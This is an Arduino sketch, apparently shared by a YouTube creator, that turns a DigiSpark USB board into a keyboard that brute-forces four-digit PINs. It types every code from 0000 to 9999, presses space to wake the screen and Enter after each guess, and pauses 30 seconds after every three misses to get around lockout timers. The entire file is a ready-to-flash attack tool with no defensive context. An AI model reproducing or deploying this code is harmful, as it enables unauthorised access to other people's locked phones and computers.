

int start = 0;
int endr = 9999;
int wrong_password_limit = 3;
int wrong_password_time = 30;




/*-----------------*/
/*CR Youtube/AdhilTech*/

int enter_key = 1;
int auto_screen_on = 1;
#include "DigiKeyboard.h"
int temp=wrong_password_limit;
String final_printer="";
void setup() {
Serial.begin(9600);
  DigiKeyboard.sendKeyStroke(0);
  delay(500);
  wrong_password_time=wrong_password_time*1000;//SecondsToMs  
  
  for(int i=start;i<=endr;i++)
  {
    if(String(i).length()<String(endr).length())
    {
     int zeroadder=String(endr).length()-String(i).length();
     for(int j=0;j<=zeroadder-1;j++){final_printer+="0";}
    }    
    final_printer+=String(i);
  if(auto_screen_on==1){
    DigiKeyboard.sendKeyStroke(44);
    delay(200);
    DigiKeyboard.sendKeyStroke(44);
    delay(200);
    }
Serial.println("FinalPrinter : "+final_printer);
  for(int lo=0;lo<final_printer.length();lo++)
  {
    
      int type=final_printer[lo];
      switch (type){
        case '1':
        DigiKeyboard.sendKeyStroke(30);
        break;
        case '2':
        DigiKeyboard.sendKeyStroke(31);
        break;
        case '3':
        DigiKeyboard.sendKeyStroke(32);
        break;
        case '4':
        DigiKeyboard.sendKeyStroke(33);
        break;
        case '5':
        DigiKeyboard.sendKeyStroke(34);
        break;
        case '6':
        DigiKeyboard.sendKeyStroke(35);
        break;
        case '7':
        DigiKeyboard.sendKeyStroke(36);
        break;
        case '8':
        DigiKeyboard.sendKeyStroke(37);
        break;
        case '9':
        DigiKeyboard.sendKeyStroke(38);
        break;
        case '0':
        DigiKeyboard.sendKeyStroke(39);
        break;
        }
       delay(200); 
  }


    if(enter_key==1){DigiKeyboard.sendKeyStroke(KEY_ENTER);
    }
        
    wrong_password_limit-=1;
    if(wrong_password_limit==0){wrong_password_limit=temp;delay(wrong_password_time);delay(500);}
    final_printer="";//Clearing
  }
}



void loop(){}//Notused
